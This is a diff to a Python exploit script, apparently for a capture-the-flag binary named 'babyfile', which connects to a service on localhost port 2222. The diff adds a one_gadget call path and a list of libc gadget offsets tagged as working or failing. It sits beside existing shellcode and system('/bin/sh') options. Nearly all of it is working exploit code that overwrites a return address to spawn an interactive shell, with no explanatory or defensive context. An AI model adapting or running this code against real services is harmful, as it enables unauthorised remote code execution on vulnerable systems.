@@ -66,6 +66,13 @@ def call_system():
     payload += p32(binsh)
     s.send(payload)
 
+def call_one_gadget(one_gadget):
+    global pad, s
+    payload = pad + 'b'*4
+    payload += p32(one_gadget)
+    s.send(payload)
+    s.interactive()
+
 #context.log_level = 'debug'
 #s = process('./babyfile')
 s = remote('localhost', 2222)
@@ -90,12 +97,25 @@ payload += p32(bss+0x500)
 payload += p32(available_read)
 choose(payload)
 
+one1 = baselibc + 0x3cbea   #success
+one2 = baselibc + 0x3cbec   #success
+one3 = baselibc + 0x3cbf0   #success
+one4 = baselibc + 0x3cbe7   #success
+one5 = baselibc + 0x6729f   #success
+one6 = baselibc + 0x672a0   #success
+one7 = baselibc + 0x13573e  #fail
+one8 = baselibc + 0x13573f  #fail
+
+
 print '1. Call Shellcode'
 print '2. Call System("/bin/sh") [Default]'
+print '3. Call Onegadget'
 try:
     choice = int(raw_input('Your choice: '), 10)
     if choice == 1:
         call_shellcode()
+    elif choice == 3:
+        call_one_gadget(one1)
     else:
         call_system()
 except:
